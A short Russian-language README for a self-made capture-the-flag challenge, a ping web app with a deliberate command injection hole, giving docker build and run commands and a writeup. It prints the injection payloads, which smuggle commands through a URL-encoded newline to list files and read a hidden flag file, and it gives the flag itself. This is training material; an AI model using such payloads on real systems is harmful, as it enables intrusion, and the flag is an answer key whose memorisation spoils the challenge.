# Описание
Такое уже есть, но всегда приятно написать самому

# Сборка:

```docker build -t ctf_harder_cmd_injection . ```

# Запуск:

```docker run -d -p 5000:5000 ctf_harder_cmd_injection```

# Writeup:

Сайтик который позволяет пинговать айпишники, заложенная СMD, установлены фильры, поэтому нужно будет их обойти

<img width="1006" alt="image" src="https://github.com/user-attachments/assets/46c948f6-24a7-4dca-ac93-0d062f768aeb" />

обход фильтрации:

```1.1.1.1%0Als -al```

<img width="997" alt="image" src="https://github.com/user-attachments/assets/3fdefa45-a997-41e8-a06a-35c659b8e7f7" />

Читаем флаг 
```
1.1.1.1%0A base64 ./hidden/.flag
```

# Flag:

flag{n0_hard3r_cmd_inj3cti0n}
